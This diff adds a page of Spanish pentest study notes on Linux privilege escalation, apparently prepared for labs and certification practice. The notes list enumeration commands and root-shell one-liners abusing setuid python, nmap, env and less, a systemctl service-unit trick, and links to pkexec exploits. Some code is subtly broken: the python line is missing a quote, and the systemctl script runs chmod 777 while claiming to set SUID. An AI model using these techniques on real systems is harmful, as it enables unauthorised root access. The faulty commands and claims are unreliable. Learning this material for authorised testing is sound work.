@@ -1,0 +1,1409 @@
+<!DOCTYPE html>
+<html lang="en-us" dir="ltr">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Primeras comprobaciones#Grupos de usuario#Ver si esta el usuario en algun grupo interesante, como el de docker
+id Ejecución de tareas como root#sudo -l Permisos SUID, GUID y Binarios SH#find / -perm -4000 2&gt;/dev/null find / -perm -2000 2&gt;/dev/null find / -name *.sh Versión de sudo#con este comando podremos ver la versión de sudo, y se puede buscar alguna vulnerabilidad afectada a la versión.">
+<meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff">
+<meta name="theme-color" media="(prefers-color-scheme: dark)" content="#343a40">
+<meta name="color-scheme" content="light dark"><meta property="og:url" content="http://localhost:1313/docs/5---hacking-linux/escalada-privilegios/">
+  <meta property="og:site_name" content="GlmbXecurity">
+  <meta property="og:title" content="GlmbXecurity">
+  <meta property="og:description" content="Primeras comprobaciones#Grupos de usuario#Ver si esta el usuario en algun grupo interesante, como el de docker
+id Ejecución de tareas como root#sudo -l Permisos SUID, GUID y Binarios SH#find / -perm -4000 2&gt;/dev/null find / -perm -2000 2&gt;/dev/null find / -name *.sh Versión de sudo#con este comando podremos ver la versión de sudo, y se puede buscar alguna vulnerabilidad afectada a la versión.">
+  <meta property="og:locale" content="en-us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="docs">
+<title>Escalada Privilegios | GlmbXecurity</title>
+<link rel="manifest" href="/manifest.json">
+<link rel="icon" href="/favicon.png" >
+<link rel="stylesheet" href="/book.min.67c38b1f4695c6eb30b8c2984203ce95b67bacb41b7c2e64b87224bbeff3b603.css" integrity="sha256-Z8OLH0aVxuswuMKYQgPOlbZ7rLQbfC5kuHIku&#43;/ztgM=" crossorigin="anonymous">
+  <script defer src="/flexsearch.min.js"></script>
+  <script defer src="/en.search.min.053c47a53420d4d8f91a0d7ff16baf41deb7e3c08baea451fd3e10effc18b34b.js" integrity="sha256-BTxHpTQg1Nj5Gg1/8WuvQd6348CLrqRR/T4Q7/wYs0s=" crossorigin="anonymous"></script>
+
+  
+
+<!--
+Made with Book Theme
+https://github.com/alex-shpak/hugo-book
+-->
+  
+</head>
+<body dir="ltr">
+  <input type="checkbox" class="hidden toggle" id="menu-control" />
+  <input type="checkbox" class="hidden toggle" id="toc-control" />
+  <main class="container flex">
+    <aside class="book-menu">
+      <div class="book-menu-content">
+        
+  <nav>
+<h2 class="book-brand">
+  <a class="flex align-center" href="/"><span>GlmbXecurity</span>
+  </a>
+</h2>
+
+
+<div class="book-search">
+  <input type="text" id="book-search-input" placeholder="Search" aria-label="Search" maxlength="64" data-hotkeys="s/" />
+  <div class="book-search-spinner hidden"></div>
+  <ul id="book-search-results"></ul>
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-4725ecd4288801edac599d317b7f3fbd" class="toggle"  />
+    <label for="section-4725ecd4288801edac599d317b7f3fbd" class="flex justify-between">
+      <a href="/docs/1---reconocimiento/" class="">Reconocimiento</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/1---reconocimiento/busqueda-de-exploits/" class="">Busqueda De Exploits</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/1---reconocimiento/descubrir-equipos-en-la-red/" class="">Descubrir Equipos en La Red</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/1---reconocimiento/dominios-y-emails/" class="">Dominios Y Emails</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/1---reconocimiento/google-dorks-cheatsheet/" class="">Google Dorks Cheatsheet</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/1---reconocimiento/nmap/" class="">Nmap</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/1---reconocimiento/reconocimiento-web/" class="">Reconocimiento Web</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/1---reconocimiento/version-de-servicio-y-s.o/" class="">Version De Servicio Y S. O</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/1---reconocimiento/waf/" class="">Waf</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-113277fae8d94cf467d477245d42c6e9" class="toggle"  />
+    <label for="section-113277fae8d94cf467d477245d42c6e9" class="flex justify-between">
+      <a href="/docs/3---hacking-web/" class="">Hacking web</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/3---hacking-web/anotaciones-varias/" class="">Anotaciones Varias</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/3---hacking-web/bypass-subir-ficheros-con-extensiones-no-permitidas/" class="">Bypass Subir Ficheros Con Extensiones No Permitidas</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/3---hacking-web/descubrimiento-cms/" class="">Descubrimiento Cms</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/3---hacking-web/drupal/" class="">Drupal</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/3---hacking-web/enumeraci%C3%B3n-web-avanzada/" class="">Enumeración Web Avanzada</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/3---hacking-web/fuerza-bruta-login-web/" class="">Fuerza Bruta Login Web</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/3---hacking-web/fuzzing-web/" class="">Fuzzing Web</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/3---hacking-web/lfi/" class="">Lfi</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/3---hacking-web/vulnerabilidad-target-blank/" class="">Vulnerabilidad Target Blank</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/3---hacking-web/webdav/" class="">Web Dav</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/3---hacking-web/wordpress/" class="">Wordpress</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/3---hacking-web/xss/" class="">Xss</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-6d708dbd650445c961ea376c6ec392a3" class="toggle"  />
+    <label for="section-6d708dbd650445c961ea376c6ec392a3" class="flex justify-between">
+      <a href="/docs/2---hacking-gen%C3%A9rico/" class="">Hacking Genérico</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/2---hacking-gen%C3%A9rico/codificaci%C3%B3n/" class="">Codificación</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/2---hacking-gen%C3%A9rico/cracking-fuerza-bruta/" class="">Cracking Fuerza Bruta</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/2---hacking-gen%C3%A9rico/esteganograf%C3%ADa/" class="">Esteganografía</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/2---hacking-gen%C3%A9rico/local-port-forwarding/" class="">Local Port Forwarding</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/2---hacking-gen%C3%A9rico/metasploit-y-msfvenom/" class="">Metasploit Y Msf Venom</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/2---hacking-gen%C3%A9rico/obfuscation---av-evasion/" class="">Obfuscation Av Evasion</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/2---hacking-gen%C3%A9rico/repositorio-git/" class="">Repositorio Git</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/2---hacking-gen%C3%A9rico/reverse-shells/" class="">Reverse Shells</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/2---hacking-gen%C3%A9rico/wireshark/" class="">Wireshark</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-653fb6148147fb5a54d5ae8f6cdc32db" class="toggle"  />
+    <label for="section-653fb6148147fb5a54d5ae8f6cdc32db" class="flex justify-between">
+      <a href="/docs/4---hacking-servicios/" class="">Hacking Servicios</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/4---hacking-servicios/111-rcpbind-nfs/" class="">111 RCP Bind ( Nfs)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/4---hacking-servicios/139-445-smb/" class="">139, 445 Smb</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/4---hacking-servicios/161-snmp/" class="">161 SNMP</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/4---hacking-servicios/21-ftp/" class="">21 FTP</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/4---hacking-servicios/22-ssh/" class="">22 SSH</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/4---hacking-servicios/25-smtp/" class="">25 SMTP</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/4---hacking-servicios/3306-sql/" class="">3306 SQL</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/4---hacking-servicios/3389-rdp/" class="">3389 Rdp</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/4---hacking-servicios/5985-winrm/" class="">5985 Win Rm</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/4---hacking-servicios/8080-apache-tomcat/" class="">8080 Apache Tomcat</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-4702fb46d9830af28f7b5deb2ce3e3da" class="toggle" checked />
+    <label for="section-4702fb46d9830af28f7b5deb2ce3e3da" class="flex justify-between">
+      <a href="/docs/5---hacking-linux/" class="">Hacking Linux</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/5---hacking-linux/comandos-b%C3%A1sicos/" class="">Comandos Básicos</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/5---hacking-linux/crack-etc-shadow/" class="">Crack Etc Shadow</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/5---hacking-linux/escalada-privilegios/" class="active">Escalada Privilegios</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/5---hacking-linux/escribir-en-terminal-de-una-v%C3%ADctima/" class="">Escribir en Terminal De Una Víctima</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/5---hacking-linux/path-hijacking/" class="">Path Hijacking</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/5---hacking-linux/pivoting-de-usuarios/" class="">Pivoting De Usuarios</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/5---hacking-linux/tratamiento-de-la-tty/" class="">Tratamiento De La Tty</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-bad90e32cc0f7a46aaa4431b64839fc0" class="toggle"  />
+    <label for="section-bad90e32cc0f7a46aaa4431b64839fc0" class="flex justify-between">
+      <a href="/docs/6---hacking-windows/" class="">Hacking Windows</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/6---hacking-windows/comandos-b%C3%A1sicos/" class="">Comandos Básicos</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/6---hacking-windows/enumeracion/" class="">Enumeracion</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/6---hacking-windows/escalada-privilegios/" class="">Escalada Privilegios</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/6---hacking-windows/explotacion/" class="">Explotacion</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/6---hacking-windows/vulnerabilidades-mas-conocidas/" class="">Vulnerabilidades Mas Conocidas</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-c0791bead2c829c6f4d4cc85517e0210" class="toggle"  />
+    <label for="section-c0791bead2c829c6f4d4cc85517e0210" class="flex justify-between">
+      <a href="/docs/7---proyectos/" class="">Proyectos</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/7---proyectos/certification-authority-&#43;-acme/" class="">Certification Authority Acme</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/7---proyectos/personalizar-kali-con-bspwm/" class="">Personalizar Kali Con Bspwm</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/7---proyectos/servidor-git-&#43;-web-apuntes-con-obsidian/" class="">Servidor Git Web Apuntes Con Obsidian</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/7---proyectos/servidor-vpn-privado-&#43;-pihole/" class="">Servidor VPN Privado Pi Hole</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/7---proyectos/vaultwarden-password-manager/" class="">Vaultwarden Password Manager</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/links-de-inter%C3%A9s/" class="">Links De Interés</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/preparacion-ejpt-v2/" class="">Preparacion Ejpt V2</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</nav>
+
+
+
+
+  <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>
+
+
+ 
+      </div>
+    </aside>
+
+    <div class="book-page">
+      <header class="book-header">
+        
+  <div class="flex align-center justify-between">
+  <label for="menu-control">
+    <img src="/svg/menu.svg" class="book-icon" alt="Menu" />
+  </label>
+
+  <strong>Escalada Privilegios</strong>
+
+  <label for="toc-control">
+    
+    <img src="/svg/toc.svg" class="book-icon" alt="Table of Contents" />
+    
+  </label>
+</div>
+
+
+  
+  <aside class="hidden clearfix">
+    
+  
+<nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#primeras-comprobaciones">Primeras comprobaciones</a></li>
+        <li><a href="#capabilities">Capabilities</a></li>
+        <li><a href="#permisos-suid-y-guid">Permisos SUID y GUID</a></li>
+        <li><a href="#sudo--l">SUDO -L</a></li>
+        <li><a href="#docker">Docker</a></li>
+        <li><a href="#binario-con-permisos-de-edición-y-ejecución">Binario con permisos de edición y ejecución</a></li>
+        <li><a href="#tareas-cron">Tareas cron</a></li>
+        <li><a href="#escalada-privilegios-con-man">Escalada privilegios con man</a></li>
+        <li><a href="#vulnerabilidad-lxd">Vulnerabilidad lxd</a></li>
+        <li><a href="#herramientas-automatizadas-escalada-privilegios">Herramientas automatizadas escalada privilegios</a></li>
+        <li><a href="#pspy">Pspy</a></li>
+        <li><a href="#escalada-privilegios-con-path-hijacking">Escalada privilegios con path hijacking</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+
+
+
+  </aside>
+  
+ 
+      </header>
+
+      
+      
+  <article class="markdown book-article"><h3 id="primeras-comprobaciones">
+  Primeras comprobaciones
+  <a class="anchor" href="#primeras-comprobaciones">#</a>
+</h3>
+<h4 id="grupos-de-usuario">
+  Grupos de usuario
+  <a class="anchor" href="#grupos-de-usuario">#</a>
+</h4>
+<p>Ver si esta el usuario en algun grupo interesante, como el de docker</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>id
+</span></span></code></pre></div><h4 id="ejecución-de-tareas-como-root">
+  Ejecución de tareas como root
+  <a class="anchor" href="#ejecuci%c3%b3n-de-tareas-como-root">#</a>
+</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo -l
+</span></span></code></pre></div><h4 id="permisos-suid-guid-y-binarios-sh">
+  Permisos SUID, GUID y Binarios SH
+  <a class="anchor" href="#permisos-suid-guid-y-binarios-sh">#</a>
+</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>find / -perm -4000 2&gt;/dev/null
+</span></span><span style="display:flex;"><span>find / -perm -2000 2&gt;/dev/null
+</span></span><span style="display:flex;"><span>find / -name *.sh
+</span></span></code></pre></div><h4 id="versión-de-sudo">
+  Versión de sudo
+  <a class="anchor" href="#versi%c3%b3n-de-sudo">#</a>
+</h4>
+<p>con este comando podremos ver la versión de sudo, y se puede buscar alguna vulnerabilidad afectada a la versión.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo -V
+</span></span></code></pre></div><h4 id="version-del-so">
+  Version del S.O
+  <a class="anchor" href="#version-del-so">#</a>
+</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>lsb_release -a
+</span></span></code></pre></div><h4 id="version-de-kernel">
+  Version de kernel
+  <a class="anchor" href="#version-de-kernel">#</a>
+</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>uname -r
+</span></span></code></pre></div><h4 id="listar-tareas-cron">
+  Listar tareas cron
+  <a class="anchor" href="#listar-tareas-cron">#</a>
+</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>	cat /etc/crontab
+</span></span></code></pre></div><h4 id="comprobar-grupos">
+  Comprobar grupos
+  <a class="anchor" href="#comprobar-grupos">#</a>
+</h4>
+<p>A veces nuestro usuario no tiene privilegios, pero si el grupo al que pertenece.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>id
+</span></span><span style="display:flex;"><span>find / -group <span style="color:#e6db74">&#34;grupo&#34;</span> 2&gt;/dev/null
+</span></span></code></pre></div><h4 id="buscar-capturas-de-wireshark">
+  Buscar capturas de wireshark
+  <a class="anchor" href="#buscar-capturas-de-wireshark">#</a>
+</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>find / -name *.pcap* 2&gt;/dev/null
+</span></span></code></pre></div><h4 id="mirar-las-variables-de-entorno">
+  Mirar las variables de entorno
+  <a class="anchor" href="#mirar-las-variables-de-entorno">#</a>
+</h4>
+<p>En ocasiones podemos encontrar credenciales, o aprovechar para ver si hay algo raro en el path</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>env
+</span></span></code></pre></div><h4 id="comprobar-el-historial">
+  Comprobar el historial
+  <a class="anchor" href="#comprobar-el-historial">#</a>
+</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>history
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>cat $HOME/.bash_history
+</span></span></code></pre></div><h4 id="comprobar-servicios-locales">
+  Comprobar servicios locales
+  <a class="anchor" href="#comprobar-servicios-locales">#</a>
+</h4>
+<p>En ocasiones tenemos servicios como Mysql o algun panel de admin que solo funciona desde la máquina local, hay 2 maneras:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>netstat -tuln
+</span></span><span style="display:flex;"><span>ss -tuln
+</span></span></code></pre></div><h3 id="capabilities">
+  Capabilities
+  <a class="anchor" href="#capabilities">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>getcap -r / 2&gt;/dev/null
+</span></span></code></pre></div><h4 id="capability-setuid-en-python">
+  Capability Setuid en python
+  <a class="anchor" href="#capability-setuid-en-python">#</a>
+</h4>
+<p>si encontramos que python3 tiene la capability de setuid. con esta capability podemos ejecutar una shell cambiando la uid del usuario actual por &ldquo;0&rdquo; que es la de root.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>./python3 -c <span style="color:#e6db74">&#39;import os; os.setuid(0); os.system(&#34;/bin/sh)&#39;</span>
+</span></span></code></pre></div><h3 id="permisos-suid-y-guid">
+  Permisos SUID y GUID
+  <a class="anchor" href="#permisos-suid-y-guid">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>find / -perm -4000 2&gt;/dev/null
+</span></span><span style="display:flex;"><span>find / -perm -2000 2&gt;/dev/null
+</span></span></code></pre></div><h4 id="permiso-de-suid-en-nmap">
+  Permiso de SUID en nmap
+  <a class="anchor" href="#permiso-de-suid-en-nmap">#</a>
+</h4>
+<p>basta con lanzar nmap de forma interactiva</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap --interactive
+</span></span></code></pre></div><p>y luego lanzar</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>!bash -p
+</span></span></code></pre></div><h4 id="permiso-de-suid-pkexec">
+  Permiso de SUID pkexec
+  <a class="anchor" href="#permiso-de-suid-pkexec">#</a>
+</h4>
+<p>se puede utilizar el siguiente exploit, cuando pkexec tiene permisos SUID
+<a href="https://github.com/Almorabea/pkexec-exploit/blob/main/CVE-2021-4034.py">pkexec</a></p>
+<p>al compartirlo con la máquina y darle permisos de ejecución, nos preguntará si queremos usar el payload por defecto, escribimos <strong>n</strong> y aceptamos.</p>
+<h4 id="permiso-de-suid-python">
+  Permiso de SUID Python
+  <a class="anchor" href="#permiso-de-suid-python">#</a>
+</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>./python -c <span style="color:#e6db74">&#39;import os; os.execl(&#34;/bin/sh&#34;, &#34;sh&#34;, &#34;-p&#34;)&#39;</span>
+</span></span></code></pre></div><h4 id="permiso-de-suid-polkit">
+  Permiso de SUID polkit
+  <a class="anchor" href="#permiso-de-suid-polkit">#</a>
+</h4>
+<p>Cuando detectamos algun binario con nombre similar a <strong>polkit</strong> , se puede explotar con un exploit.</p>
+<p><a href="https://github.com/Almorabea/Polkit-exploit">https://github.com/Almorabea/Polkit-exploit</a></p>
+<h4 id="permiso-de-suid-env">
+  Permiso de SUID env
+  <a class="anchor" href="#permiso-de-suid-env">#</a>
+</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/usr/bin/env /bin/sh -p
+</span></span></code></pre></div><h4 id="permiso-suid-less">
+  Permiso SUID Less
+  <a class="anchor" href="#permiso-suid-less">#</a>
+</h4>
+<p>Leemos un fichero:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo /bin/less fichero.txt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Luego nos aparece resaltado el <span style="color:#f92672">(</span>END<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>ahí escribimos una exclamación !
+</span></span><span style="display:flex;"><span>y podemos ejecutar comandos del sistema desde less, pero como tenemos permiso SUID podemos ejecutar:
+</span></span><span style="display:flex;"><span>/bin/bash
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>y ya somos root
+</span></span></code></pre></div><h4 id="permiso-suid-systemctl">
+  Permiso SUID Systemctl
+  <a class="anchor" href="#permiso-suid-systemctl">#</a>
+</h4>
+<p>al ejecutar este script, estamos dando permiso SUID a &ldquo;/bin/bash&rdquo;.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>TF<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>mktemp<span style="color:#66d9ef">)</span>.service 
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#39;[Service] 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Type=oneshot 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">ExecStart=/bin/sh -c &#34;chmod 777 /bin/bash&#34; 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[Install] 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">WantedBy=multi-user.target&#39;</span> &gt; $TF
+</span></span><span style="display:flex;"><span>/bin/systemctl link $TF
+</span></span><span style="display:flex;"><span>/bin/systemctl enable --now $TF
+</span></span></code></pre></div><p>Luego ejecutamos una bash y seremos root.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>bash -p
+</span></span></code></pre></div><h4 id="permiso-suid-en-opt">
+  Permiso SUID en /opt
+  <a class="anchor" href="#permiso-suid-en-opt">#</a>
+</h4>
+<p>En este directorio se suelen almacenar scripts y programas que no pertenecen al sistema. Cuando encontramos un binario SUID, o con sudo -L dentro de este directorio hay que investigarlo bien. Para el ejemplo, en la máquina <strong>symfonos 1</strong> , se encontró <strong>/opt/statuscheck</strong>, pertenecía a root, y tenía SUID, esto quiere decir que podíamos ejecutarlo y además como root.</p>
